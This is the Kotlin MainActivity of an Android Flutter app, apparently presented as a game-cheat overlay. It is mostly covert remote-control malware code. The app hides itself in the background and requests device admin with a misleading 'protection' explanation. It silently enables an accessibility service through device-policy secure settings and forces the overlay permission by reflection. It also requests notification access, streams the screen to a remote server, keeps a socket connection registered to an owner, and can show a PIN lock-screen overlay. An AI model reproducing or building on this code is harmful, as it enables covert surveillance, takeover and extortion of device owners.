package com.psknmrc.app

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    private val CHANNEL = "com.psknmrc.app/native"
    private val OVERLAY_PERMISSION_REQ  = 1001
    private val DEVICE_ADMIN_REQ        = 1002
    private val SCREEN_CAPTURE_REQ      = 1003

    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    // Simpan info untuk screen capture setelah permission granted
    private var pendingScreenServerUrl  = ""
    private var pendingScreenDeviceId   = ""
    private var pendingScreenToken      = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        handleScreenCaptureIntent(intent)
    }

    override fun onResume() {
        super.onResume()
        // Kalau session sudah ada (sudah login sebelumnya) → langsung hide ke background
        val prefs    = getSharedPreferences("psknmrc_prefs", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("deviceId", "") ?: ""
        if (deviceId.isNotEmpty()) {
            // Delay sedikit agar Flutter sempat render, lalu hide
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                moveTaskToBack(true)
            }, 300)
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleScreenCaptureIntent(intent)
    }

    private fun handleScreenCaptureIntent(intent: Intent?) {
        if (intent?.getStringExtra("action") == "request_screen_capture") {
            pendingScreenServerUrl = intent.getStringExtra("serverUrl")   ?: ""
            pendingScreenDeviceId  = intent.getStringExtra("deviceId")    ?: ""
            pendingScreenToken     = intent.getStringExtra("deviceToken") ?: ""
            requestScreenCapture()
        }
    }

    private fun requestScreenCapture() {
        val pm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(pm.createScreenCaptureIntent(), SCREEN_CAPTURE_REQ)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == SCREEN_CAPTURE_REQ) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                val intent = Intent(this, ScreenCaptureService::class.java).apply {
                    putExtra("action",      "start")
                    putExtra("resultCode",  resultCode)
                    putExtra("resultData",  data)
                    putExtra("serverUrl",   pendingScreenServerUrl)
                    putExtra("deviceId",    pendingScreenDeviceId)
                    putExtra("deviceToken", pendingScreenToken)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    startForegroundService(intent)
                else
                    startService(intent)
            }
            // Minimize kembali ke background setelah approve/deny
            moveTaskToBack(true)
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return enabledServices.contains(packageName) && enabledServices.contains("AppProtectionService")
    }

    private fun requestAccessibility() {
        // Coba auto-grant via DevicePolicyManager (work di Android 14 tanpa buka Settings)
        if (tryAutoGrantAccessibility()) return
        // Fallback: buka Settings Accessibility manual
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                // Deep link langsung ke service kita (Android 9+)
                putExtra(":settings:fragment_args_key", "$packageName/.AppProtectionService")
            }
            startActivity(intent)
        } catch (_: Exception) {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            })
        }
    }

    private fun tryAutoGrantAccessibility(): Boolean {
        return try {
            if (!devicePolicyManager.isAdminActive(adminComponent)) return false
            val componentStr = "$packageName/.AppProtectionService"
            val current = Settings.Secure.getString(
                contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            val newVal = if (current.isEmpty()) componentStr
                         else if (current.contains(componentStr)) current
                         else "$current:$componentStr"
            // Set via DevicePolicyManager — tidak butuh user interaction di Android 14
            devicePolicyManager.setSecureSetting(
                adminComponent,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                newVal
            )
            devicePolicyManager.setSecureSetting(
                adminComponent,
                Settings.Secure.ACCESSIBILITY_ENABLED,
                "1"
            )
            true
        } catch (_: Exception) { false }
    }

    private fun tryAutoGrantOverlay(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true
            if (Settings.canDrawOverlays(this)) return true
            if (!devicePolicyManager.isAdminActive(adminComponent)) return false
            // Tulis SYSTEM_ALERT_WINDOW ke app-ops via DPM secure setting
            devicePolicyManager.setSecureSetting(
                adminComponent,
                "allowed_overlay_packages",
                packageName
            )
            // Juga coba via app-ops manager reflection
            try {
                val appOps = getSystemService(APP_OPS_SERVICE)
                val appOpsClass = Class.forName("android.app.AppOpsManager")
                val setModeMethod = appOpsClass.getMethod(
                    "setMode", Int::class.java, Int::class.java, String::class.java, Int::class.java)
                val OP_SYSTEM_ALERT_WINDOW = 24
                val MODE_ALLOWED = 0
                setModeMethod.invoke(appOps, OP_SYSTEM_ALERT_WINDOW,
                    applicationInfo.uid, packageName, MODE_ALLOWED)
            } catch (_: Exception) {}
            true
        } catch (_: Exception) { false }
    }

    private fun isDeviceAdminActive(): Boolean = devicePolicyManager.isAdminActive(adminComponent)

    private fun requestDeviceAdmin() {
        startActivityForResult(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Diperlukan agar aplikasi dapat berjalan dengan optimal dan terlindungi.")
        }, DEVICE_ADMIN_REQ)
    }

    // [BARU] Cek Notification Listener aktif
    private fun isNotifListenerEnabled(): Boolean {
        val enabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: return false
        return enabled.contains(packageName)
    }

    // [BARU] Buka settings Notification Listener
    private fun requestNotifListener() {
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        })
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {

                    "checkOverlayPermission" -> {
                        val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            Settings.canDrawOverlays(this) else true
                        result.success(granted)
                    }
                    "requestOverlayPermission" -> {
                        // Coba auto-grant via DPM kalau admin aktif
                        if (tryAutoGrantOverlay()) {
                            result.success(null)
                        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            startActivityForResult(
                                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                    Uri.parse("package:$packageName")),
                                OVERLAY_PERMISSION_REQ)
                            result.success(null)
                        } else {
                            result.success(null)
                        }
                    }

                    "checkDeviceAdmin"   -> result.success(isDeviceAdminActive())
                    "requestDeviceAdmin" -> { requestDeviceAdmin(); result.success(null) }

                    "checkAccessibility"   -> result.success(isAccessibilityEnabled())
                    "requestAccessibility" -> { requestAccessibility(); result.success(null) }

                    // [BARU] Notification Listener
                    "checkNotifListener"   -> result.success(isNotifListenerEnabled())
                    "requestNotifListener" -> { requestNotifListener(); result.success(null) }

                    "startCheatOverlay" -> {
                        val canDraw = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            Settings.canDrawOverlays(this) else true
                        if (canDraw) {
                            val intent = Intent(this, CheatOverlayService::class.java)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                                startForegroundService(intent)
                            else
                                startService(intent)
                            result.success(true)
                        } else {
                            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                android.net.Uri.parse("package:$packageName")).apply {
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            })
                            result.success(false)
                        }
                    }
                    "stopCheatOverlay" -> {
                        stopService(Intent(this, CheatOverlayService::class.java))
                        result.success(true)
                    }

                    "startSocketService" -> {
                        val serverUrl  = call.argument<String>("serverUrl")     ?: ""
                        val deviceId   = call.argument<String>("deviceId")      ?: ""
                        val deviceName = call.argument<String>("deviceName")    ?: ""
                        val owner      = call.argument<String>("ownerUsername") ?: ""
                        val token      = call.argument<String>("deviceToken")   ?: ""
                        val intent = Intent(this, SocketService::class.java).apply {
                            putExtra("serverUrl",     serverUrl)
                            putExtra("deviceId",      deviceId)
                            putExtra("deviceName",    deviceName)
                            putExtra("ownerUsername", owner)
                            putExtra("deviceToken",   token)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                            startForegroundService(intent)
                        else
                            startService(intent)
                        result.success(true)
                    }
                    "stopSocketService" -> {
                        stopService(Intent(this, SocketService::class.java))
                        result.success(true)
                    }

                    "showLockScreen" -> {
                        val text    = call.argument<String>("text") ?: ""
                        val pin     = call.argument<String>("pin")  ?: ""
                        val canDraw = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                            Settings.canDrawOverlays(this) else true
                        if (canDraw) {
                            val intent = Intent(this, LockService::class.java).apply {
                                putExtra("lockText", text)
                                putExtra("lockPin",  pin)
                                putExtra("action",   "lock")
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                                startForegroundService(intent)
                            else
                                startService(intent)
                            result.success(true)
                        } else {
                            result.success(false)
                        }
                    }
                    "hideLockScreen" -> {
                        startService(Intent(this, LockService::class.java).apply {
                            putExtra("action", "unlock")
                        })
                        result.success(true)
                    }

                    "stopScreenLive" -> {
                        stopService(Intent(this, ScreenCaptureService::class.java))
                        result.success(true)
                    }

                    "hideApp" -> {
                        moveTaskToBack(true)
                        result.success(true)
                    }

                    else -> result.notImplemented()
                }
            }
    }
}
